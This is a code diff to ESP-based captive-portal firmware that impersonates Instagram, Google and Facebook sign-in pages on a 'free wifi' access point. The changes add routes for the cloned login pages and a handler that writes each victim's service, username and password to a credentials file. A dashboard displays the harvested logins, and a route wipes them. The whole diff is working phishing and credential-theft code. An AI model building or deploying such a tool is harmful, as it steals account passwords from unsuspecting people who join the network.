@@ -16,7 +16,7 @@ String dashboardProcessor(const String& var) {
     return ap_pass_str;
   }
   if (var == "LIST") {
-    File credentials = SPIFFS.open("/creds.socx", "r");
+    File credentials = SPIFFS.open("/core/creds.socx", "r");
     String creds = credentials.readString();
     return creds;
   }
@@ -27,33 +27,67 @@ String dashboardProcessor(const String& var) {
 class CaptiveRequestHandler : public AsyncWebHandler {
 public:
   CaptiveRequestHandler() {
+    //START OF AUTH METHOD
     server.on("/", HTTP_GET, [](AsyncWebServerRequest * request) {
-      request->send(SPIFFS, "/instagram.html", String(), false, dashboardProcessor);
+      request->send(SPIFFS, "/htmls/selectAuthMethod.html", String(), false, dashboardProcessor);
+    });
+    // END OF AUTH METHOD
+
+    //START OF INSTAGRAM
+    server.on("/instagram_auth", HTTP_GET, [](AsyncWebServerRequest * request) {
+      request->send(SPIFFS, "/htmls/instagram.html", String(), false, dashboardProcessor);
     });
     server.on("/instagram_style.css", HTTP_GET, [](AsyncWebServerRequest * request) {
-      request->send(SPIFFS, "/instagram_style.css", "text/css");
+      request->send(SPIFFS, "/styles/instagram_style.css", "text/css");
     });
+    server.on("/instagram.png", HTTP_GET, [](AsyncWebServerRequest * request) {
+      request->send(SPIFFS, "/imgs/instagram.png", "image/png");
+    });
+    //END OF INSTAGRAM
+
+    //START OF GOOGLE
+    server.on("/google_auth", HTTP_GET, [](AsyncWebServerRequest * request) {
+      request->send(SPIFFS, "/htmls/google.html", String(), false, dashboardProcessor);
+    });
+    server.on("/google_style.css", HTTP_GET, [](AsyncWebServerRequest * request) {
+      request->send(SPIFFS, "/styles/google_style.css", "text/css");
+    });
+    server.on("/google.png", HTTP_GET, [](AsyncWebServerRequest * request) {
+      request->send(SPIFFS, "/imgs/google.png", "image/png");
+    });
+    //END OF GOOGLE
+
+    //START OF FACEBOOK
+    server.on("/facebook_auth", HTTP_GET, [](AsyncWebServerRequest * request) {
+      request->send(SPIFFS, "/htmls/facebook.html", String(), false, dashboardProcessor);
+    });
+    server.on("/facebook_style.css", HTTP_GET, [](AsyncWebServerRequest * request) {
+      request->send(SPIFFS, "/styles/facebook_style.css", "text/css");
+    });
+    //END OF FACEBOOK
+    
+    //START OF CORE
     server.on("/dashboard", HTTP_GET, [](AsyncWebServerRequest * request) {
-      request->send(SPIFFS, "/dashboard.html", String(), false, dashboardProcessor);
+      request->send(SPIFFS, "/htmls/dashboard.html", String(), false, dashboardProcessor);
     });
     server.on("/credentials", HTTP_GET, [](AsyncWebServerRequest * request) {
-      request->send(SPIFFS, "/credentials.html", String(), false, dashboardProcessor);
+      request->send(SPIFFS, "/htmls/credentials.html", String(), false, dashboardProcessor);
     });
     server.on("/suicide", HTTP_GET, [](AsyncWebServerRequest * request) {
       SPIFFS.remove("/creds.socx");
       request->redirect("/credentials");
     });
     server.on("/style.css", HTTP_GET, [](AsyncWebServerRequest * request) {
-      request->send(SPIFFS, "/style.css", "text/css");
-    });
-    server.on("/instagram.png", HTTP_GET, [](AsyncWebServerRequest * request) {
-      request->send(SPIFFS, "/instagram.png", "image/png");
-    });
-    server.on("/success", HTTP_GET, [](AsyncWebServerRequest * request) {
-      String user, pass;
+      request->send(SPIFFS, "/styles/style.css", "text/css");
+    });  
+    server.on("/verified", HTTP_GET, [](AsyncWebServerRequest * request) {
+      String authMethod, user, pass;
       int paramsNr = request->params();
       for (int i = 0; i < paramsNr; i++) {
         AsyncWebParameter* p = request->getParam(i);
+        if (p->name() == "authMethod") {
+          authMethod = p->value();
+        }
         if (p->name() == "username") {
           user = p->value();
         }
@@ -61,11 +95,11 @@ public:
           pass = p->value() + "<br><br>";
         }
       }
-      File credentials = SPIFFS.open("/creds.socx", "a");
-      String creds = "Username: " + user + " Password: " + pass;
+      File credentials = SPIFFS.open("/core/creds.socx", "a");
+      String creds = "<strong>Auth Method:</strong> " + authMethod + " <strong>Username:</strong> " + user + " <strong>Password:</strong> " + pass;
       credentials.print(creds);
       credentials.close();
-      request->send(SPIFFS, "/instagram_success.html", String(), false, dashboardProcessor);
+      request->send(SPIFFS, "/htmls/success.html", String(), false, dashboardProcessor);
     });
     server.on("/apply", HTTP_GET, [](AsyncWebServerRequest * request) {
       int paramsNr = request->params();
@@ -78,7 +112,7 @@ public:
           ap_pass_str = p->value() + "\n";
         }
       }
-      File settings = SPIFFS.open("/settings.socx", "w");
+      File settings = SPIFFS.open("/core/settings.socx", "w");
       settings.print(ap_ssid_str);
       settings.print(ap_pass_str);
       settings.close();
@@ -86,6 +120,10 @@ public:
       delay(2000);
       ESP.restart();
     });
+    server.on("/freewifi.png", HTTP_GET, [](AsyncWebServerRequest * request) {
+      request->send(SPIFFS, "/imgs/freewifi.png", "image/png");
+    });
+    //END OF CORE
   }
   virtual ~CaptiveRequestHandler() {}
 
@@ -95,15 +133,15 @@ public:
   }
 
   void handleRequest(AsyncWebServerRequest *request) {
-    request->send(SPIFFS, "/instagram.html", String(), false, dashboardProcessor);  
+    request->send(SPIFFS, "/htmls/selectAuthMethod.html", String(), false, dashboardProcessor);  
   }
 };
 
 void setup() {
   Serial.begin(115200);
   SPIFFS.begin();
-  if (SPIFFS.exists("/settings.socx")) {
-    File settings = SPIFFS.open("/settings.socx", "r");
+  if (SPIFFS.exists("/core/settings.socx")) {
+    File settings = SPIFFS.open("/core/settings.socx", "r");
     int i = 0;
     char buffer[64];
     while (settings.available()) {
